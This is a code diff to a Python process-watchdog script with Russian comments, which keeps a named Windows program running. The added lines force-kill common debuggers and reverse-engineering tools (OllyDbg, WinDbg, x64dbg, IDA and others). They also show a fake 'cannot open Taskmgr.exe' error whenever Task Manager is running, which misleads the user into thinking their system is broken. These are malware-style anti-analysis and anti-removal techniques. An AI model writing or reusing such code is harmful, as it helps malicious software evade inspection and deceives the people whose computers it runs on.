@@ -1,9 +1,16 @@
 import asyncio
 import subprocess
 import ctypes
+import tkinter as tk
+from tkinter import messagebox
+
+root = tk.Tk()
+root.withdraw()
 
 process_name = "example.exe"  # имя процесса, который нужно проверить
 process_file_path = "C:\\Path\\To\\Process\\File\\example.exe"  # путь к файлу процесса
+
+debuggers = ['OllyDbg.exe', 'WinDbg.exe', 'devenv.exe', 'gdb.exe', 'x64dbg.exe', 'idaw.exe', 'immunitydebugger.exe']
 
 async def check_and_restart_process():
     while True:
@@ -24,6 +31,11 @@ async def check_and_restart_process():
                 print(f"Не удалось запустить процесс: {e}")
         else:
             print("Процесс уже работает")
+        for debugger in debuggers:
+            if debugger in output:
+                subprocess.run(["taskkill", "/IM", f"{debugger}", "/F"])
+        if 'taskmgr.exe' in output:
+            messagebox.showerror("Ошибка", "Не удается открыть файл Taskmgr.exe. Код ошибки 0x000000FF. Пожалуйста, попробуйте удалить и заново установить программу, либо обратитесь к специалисту за помощью.")
 
         await asyncio.sleep(60)  # ждем 60 секунд перед следующей проверкой
 
